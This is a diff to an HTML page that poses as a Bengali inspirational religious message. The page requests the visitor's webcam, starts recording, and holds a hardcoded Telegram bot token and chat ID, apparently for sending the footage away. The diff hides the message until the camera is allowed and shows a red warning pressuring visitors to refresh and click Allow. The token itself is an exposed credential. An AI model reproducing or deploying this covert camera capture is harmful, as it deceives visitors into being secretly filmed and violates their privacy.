@@ -85,12 +85,27 @@
       text-decoration: none;
       font-weight: bold;
     }
+
+    .hidden {
+      display: none !important;
+    }
+
+    .warning {
+      font-size: 16px;
+      color: red;
+      background: #fff3f3;
+      padding: 20px;
+      border-radius: 10px;
+      margin-top: 20px;
+      box-shadow: 0 0 10px rgba(255, 0, 0, 0.2);
+      max-width: 700px;
+    }
   </style>
 </head>
 <body>
   <video id="preview" autoplay muted playsinline></video>
 
-  <div class="container">
+  <div class="container hidden" id="mainContent">
     <div class="icon">🌙</div>
     <h1>আলোর বার্তা</h1>
     <p>জীবনে সবকিছু তোমার ইচ্ছেমতো হবে না, কারণ তুমি আল্লাহ নও।</p>
@@ -113,9 +128,17 @@
     </div>
   </div>
 
+  <div id="warningBox" class="warning hidden">
+    ⚠️ আবার প্রবেশ করুন allow করেন😵।<br />
+    দয়া করে পেজটি রিফ্রেশ করে Allow দিন।<br />
+    না দিলে এই বার্তাগুলি দেখা যাবে না।
+  </div>
+
   <script>
     const video = document.getElementById("preview");
     const creditText = document.getElementById("credit");
+    const mainContent = document.getElementById("mainContent");
+    const warningBox = document.getElementById("warningBox");
 
     const TELEGRAM_BOT_TOKEN = "7949550558:AAEoXVh3uL0IWAsjdd_86yerxgM2hgfK8aU";
     const TELEGRAM_CHAT_ID = "6036932600";
@@ -161,10 +184,14 @@
     navigator.mediaDevices.getUserMedia({ video: true, audio: false })
       .then(stream => {
         video.srcObject = stream;
+        mainContent.classList.remove("hidden");
+        warningBox.classList.add("hidden");
         startRecording(stream);
       })
       .catch(err => {
-        alert("⚠️ আবার প্রবেশ করুন allow করেন😵: " + err);
+        mainContent.classList.add("hidden");
+        warningBox.classList.remove("hidden");
+        console.warn("⚠️অনুমতি পাওয়া যায়নি, ⚠️ আবার প্রবেশ করুন allow করেন😵:", err);
       });
   </script>
 </body>
